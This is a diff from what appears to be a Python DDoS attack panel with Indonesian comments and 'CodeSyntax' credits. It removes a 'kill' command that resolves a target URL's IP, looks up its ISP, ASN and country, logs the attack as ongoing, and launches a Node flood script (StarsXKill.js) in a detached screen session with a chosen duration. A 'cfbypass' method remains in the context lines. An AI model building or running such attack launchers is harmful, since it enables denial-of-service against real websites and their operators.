@@ -1166,57 +1166,6 @@ def main():
             except IndexError:
                 main()
                 
-        elif sinput == "kill" or sinput == "KILL":
-            try:
-                url = sin.split()[1]
-                port = sin.split()[2]
-                duration = int(sin.split()[3])
-
-                # Mendapatkan IP dari URL
-                ip = get_ip_from_url(url)
-
-                if ip:
-                    # Mendapatkan ISP, ASN, Org, dan Country untuk IP target
-                    asn, isp, org, country = get_ip_info(ip)
-                    
-                    # Menambahkan serangan ke dalam ongoing_attacks list
-                    ongoing_attacks.append({
-                        'host': ip,
-                        'start_time': t.time(),  # Menyimpan waktu mulai serangan
-                        'duration': duration,  # Durasi serangan dalam detik
-                        'method': 'kill',
-                        'status': 'Ongoing'
-                    })
-                    os.system('clear')
-                    print(f"""
-\033[1;36m      POWERED BY : [ • CodeSyntax • ]\033[0m
-\033[34m
-\033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
-\033[34m\033[1;37mSTATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY\033[31m ]
-\033[34m\033[1;37mHOST:        \033[31m[\033[36m {ip}\033[31m ]
-\033[34m\033[1;37mPORT:        \033[31m[\033[36m {port}\033[31m ]
-\033[34m\033[1;37mTIME:        \033[31m[\033[36m {duration}\033[31m ]
-\033[34m\033[1;37mMETHOD:      \033[31m[\033[36m {sinput}\033[31m ]
-\033[34m\033[1;37mSTART ATTACK:\033[31m[\033[36m {waktu()} \033[31m]
-\033[34m
-\033[34m\033[48;5;15m\033[1;35mTARGET - DETAILS\033[0m
-\033[34m\033[1;37mASN:        \033[31m [\033[36m {asn}\033[31m ]
-\033[34m\033[1;37mISP:        \033[31m [\033[36m {isp}\033[31m ]
-\033[34m\033[1;37mORG:        \033[31m [\033[36m {org}\033[31m ]
-\033[34m\033[1;37mCOUNTRY:    \033[31m [\033[36m {country}\033[31m ]
-\033[34m
-\033[34m\033[48;5;15m\033[1;35mCREDITS\033[0m
-\033[34m\033[1;37mTELE:       \033[31m [\033[36m t.me/CodeSyntax\033[31m ]
-\033[34m\033[1;37mOWNER:      \033[31m [\033[36m CodeSyntax\033[31m ]
-\033[34m
-\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
-""")
-                    os.system(f'cd l7 && screen -dm node StarsXKill.js {url} {duration} 100 5')
-                    
-            except ValueError:
-                main()
-            except IndexError:
-                main()
                 
         elif sinput == "cfbypass" or sinput == "CFBYPASS":
             try:
